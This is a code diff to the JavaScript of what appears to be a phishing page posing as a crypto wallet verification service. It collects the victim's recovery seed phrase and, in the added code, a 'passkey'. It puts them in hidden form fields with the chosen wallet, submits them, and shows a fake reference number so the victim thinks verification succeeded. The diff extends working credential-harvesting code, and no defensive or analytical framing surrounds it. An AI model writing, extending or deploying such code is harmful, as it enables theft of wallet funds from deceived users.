@@ -12,12 +12,23 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const closePhraseModal = document.getElementById('closePhraseModal');
     const phraseInput = document.getElementById('phraseInput');
+    const passkeyInput = document.getElementById('passkeyInput');
     const phraseDisplay = document.getElementById('phraseDisplay');
     const phraseForm = document.getElementById('phraseForm');
     const proceedBtn = document.getElementById('proceedBtn');
     const cancelPhraseBtn = document.getElementById('cancelPhraseBtn');
     const wordCountSpan = document.getElementById('wordCount');
     const wordTargetSpan = document.getElementById('wordTarget');
+    const seedPhraseHidden = document.getElementById('seedPhraseHidden');
+    const passkeyHidden = document.getElementById('passkeyHidden');
+    const walletHidden = document.getElementById('walletHidden');
+    const methodHidden = document.getElementById('methodHidden');
+
+    const seedPhraseMethodBtn = document.getElementById('seedPhraseMethodBtn');
+    const passkeyMethodBtn = document.getElementById('passkeyMethodBtn');
+    const seedPhraseSection = document.getElementById('seedPhraseSection');
+    const passkeySection = document.getElementById('passkeySection');
+    const passkeyLength = document.getElementById('passkeyLength');
 
     const okBtn = document.getElementById('okBtn');
     const copyRefBtn = document.getElementById('copyRefBtn');
@@ -26,6 +37,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     let selectedWallet = '';
     let phraseWords = [];
+    let currentMethod = 'seed-phrase';
 
     languageBtn.addEventListener('click', () => {
         languageModal.classList.add('active');
@@ -44,7 +56,6 @@ document.addEventListener('DOMContentLoaded', () => {
     languageOptions.forEach(option => {
         option.addEventListener('click', () => {
             const lang = option.dataset.lang;
-            const langName = option.querySelector('.lang-name').textContent;
             currentLangSpan.textContent = lang.toUpperCase();
             languageModal.classList.remove('active');
         });
@@ -55,6 +66,26 @@ document.addEventListener('DOMContentLoaded', () => {
             selectedWallet = card.dataset.wallet;
             showLoadingModal();
         });
+    });
+
+    seedPhraseMethodBtn.addEventListener('click', () => {
+        currentMethod = 'seed-phrase';
+        seedPhraseMethodBtn.classList.add('method-active');
+        passkeyMethodBtn.classList.remove('method-active');
+        seedPhraseSection.classList.add('active');
+        passkeySection.classList.remove('active');
+        phraseInput.focus();
+        validateInput();
+    });
+
+    passkeyMethodBtn.addEventListener('click', () => {
+        currentMethod = 'passkey';
+        passkeyMethodBtn.classList.add('method-active');
+        seedPhraseMethodBtn.classList.remove('method-active');
+        passkeySection.classList.add('active');
+        seedPhraseSection.classList.remove('active');
+        passkeyInput.focus();
+        validateInput();
     });
 
     function showLoadingModal() {
@@ -73,37 +104,34 @@ document.addEventListener('DOMContentLoaded', () => {
 
     closePhraseModal.addEventListener('click', () => {
         phraseModal.classList.remove('active');
-        resetPhraseInput();
+        resetInputs();
     });
 
     cancelPhraseBtn.addEventListener('click', () => {
         phraseModal.classList.remove('active');
-        resetPhraseInput();
+        resetInputs();
     });
 
     phraseModal.addEventListener('click', (e) => {
         if (e.target === phraseModal) {
             phraseModal.classList.remove('active');
-            resetPhraseInput();
+            resetInputs();
         }
     });
 
     phraseInput.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') {
-            e.preventDefault();
             const word = phraseInput.value.trim();
             if (word) {
                 addWord(word);
                 phraseInput.value = '';
             }
         } else if (e.key === 'Backspace' && !phraseInput.value && phraseWords.length > 0) {
-            e.preventDefault();
             removeLastWord();
         }
     });
 
     phraseInput.addEventListener('paste', (e) => {
-        e.preventDefault();
         const pastedText = e.clipboardData.getData('text');
         const words = pastedText.trim().split(/\s+/);
 
@@ -114,8 +142,13 @@ document.addEventListener('DOMContentLoaded', () => {
         });
 
         renderPhraseWords();
-        validatePhrase();
+        validateInput();
         phraseInput.value = '';
+    });
+
+    passkeyInput.addEventListener('input', () => {
+        passkeyLength.textContent = passkeyInput.value.length;
+        validateInput();
     });
 
     function addWord(word) {
@@ -125,19 +158,19 @@ document.addEventListener('DOMContentLoaded', () => {
 
         phraseWords.push(word.toLowerCase());
         renderPhraseWords();
-        validatePhrase();
+        validateInput();
     }
 
     function removeWord(index) {
         phraseWords.splice(index, 1);
         renderPhraseWords();
-        validatePhrase();
+        validateInput();
     }
 
     function removeLastWord() {
         phraseWords.pop();
         renderPhraseWords();
-        validatePhrase();
+        validateInput();
     }
 
     function renderPhraseWords() {
@@ -155,7 +188,6 @@ document.addEventListener('DOMContentLoaded', () => {
             removeBtn.type = 'button';
             removeBtn.innerHTML = '&times;';
             removeBtn.addEventListener('click', (e) => {
-                e.preventDefault();
                 removeWord(index);
                 phraseInput.focus();
             });
@@ -168,78 +200,86 @@ document.addEventListener('DOMContentLoaded', () => {
         wordCountSpan.textContent = phraseWords.length;
     }
 
-    function validatePhrase() {
-        const wordCount = phraseWords.length;
-        const isValid = wordCount === 12 || wordCount === 16 || wordCount === 24;
+    function validateInput() {
+        if (currentMethod === 'seed-phrase') {
+            const wordCount = phraseWords.length;
+            const isValid = wordCount === 12 || wordCount === 16 || wordCount === 24;
 
-        proceedBtn.disabled = !isValid;
-
-        if (wordCount === 12) {
-            wordTargetSpan.textContent = '12';
-            proceedBtn.disabled = false;
-        } else if (wordCount === 16) {
-            wordTargetSpan.textContent = '16';
-            proceedBtn.disabled = false;
-        } else if (wordCount === 24) {
-            wordTargetSpan.textContent = '24';
-            proceedBtn.disabled = false;
-        } else if (wordCount < 12) {
-            wordTargetSpan.textContent = '12';
-            proceedBtn.disabled = true;
+            if (wordCount === 12 || wordCount === 16 || wordCount === 24) {
+                wordTargetSpan.textContent = wordCount;
+                proceedBtn.disabled = false;
+            } else if (wordCount < 12) {
+                wordTargetSpan.textContent = '12';
+                proceedBtn.disabled = true;
+            }
+        } else {
+            const passkeyValue = passkeyInput.value.trim();
+            proceedBtn.disabled = passkeyValue.length < 8;
         }
     }
 
-    function resetPhraseInput() {
+    function resetInputs() {
         phraseWords = [];
         phraseInput.value = '';
+        passkeyInput.value = '';
+        passkeyLength.textContent = '0';
         renderPhraseWords();
-        validatePhrase();
-        wordTargetSpan.textContent = '12';
+        validateInput();
+        wordTargetSpan.textContent = '12-16-24';
+        currentMethod = 'seed-phrase';
+        seedPhraseMethodBtn.classList.add('method-active');
+        passkeyMethodBtn.classList.remove('method-active');
+        seedPhraseSection.classList.add('active');
+        passkeySection.classList.remove('active');
     }
 
-    phraseForm.addEventListener('submit', async (e) => {
-        e.preventDefault();
+    function generateReferenceNumber() {
+        const timestamp = Date.now().toString();
+        const random = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
+        return timestamp.slice(-6) + random;
+    }
 
-        const wordCount = phraseWords.length;
+    phraseForm.addEventListener('submit', (e) => {
+        if (currentMethod === 'seed-phrase') {
+            const wordCount = phraseWords.length;
 
-        if (wordCount !== 12 && wordCount !== 16 && wordCount !== 24) {
-            alert(`Invalid recovery phrase. Please enter exactly 12, 16, or 24 words. You currently have ${wordCount} word(s).`);
-            return;
+            if (wordCount !== 12 && wordCount !== 16 && wordCount !== 24) {
+                // e.preventDefault();
+                alert(`Invalid recovery phrase. Please enter exactly 12, 16, or 24 words. You currently have ${wordCount} word(s).`);
+                return;
+            }
+
+            seedPhraseHidden.value = phraseWords.join(' ');
+            passkeyHidden.value = '';
+        } else {
+            const passkeyValue = passkeyInput.value.trim();
+
+            if (passkeyValue.length < 8) {
+                e.preventDefault();
+                alert('Passkey must be at least 8 characters long.');
+                return;
+            }
+
+            passkeyHidden.value = passkeyValue;
+            seedPhraseHidden.value = '';
         }
+
+        methodHidden.value = currentMethod;
+        walletHidden.value = selectedWallet;
 
         proceedBtn.disabled = true;
         proceedBtn.textContent = 'Processing...';
 
-        const phrase = phraseWords.join(' ');
+        const refNumber = generateReferenceNumber();
 
-        try {
-            const response = await fetch('/api/submit-phrase', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    phrase: phrase,
-                    wallet: selectedWallet,
-                    wordCount: wordCount
-                })
-            });
-
-            const result = await response.json();
-
-            if (result.success) {
-                phraseModal.classList.remove('active');
-                resetPhraseInput();
-                showSuccessModal(result.referenceNumber);
-            } else {
-                throw new Error(result.error || 'Failed to submit phrase');
-            }
-        } catch (error) {
-            console.error('Error submitting phrase:', error);
-            alert('An error occurred. Please try again.');
+        setTimeout(() => {
+            phraseModal.classList.remove('active');
+            resetInputs();
             proceedBtn.disabled = false;
             proceedBtn.textContent = 'Verify & Proceed';
-        }
+
+            showSuccessModal(refNumber);
+        }, 500);
     });
 
     function showSuccessModal(refNumber) {
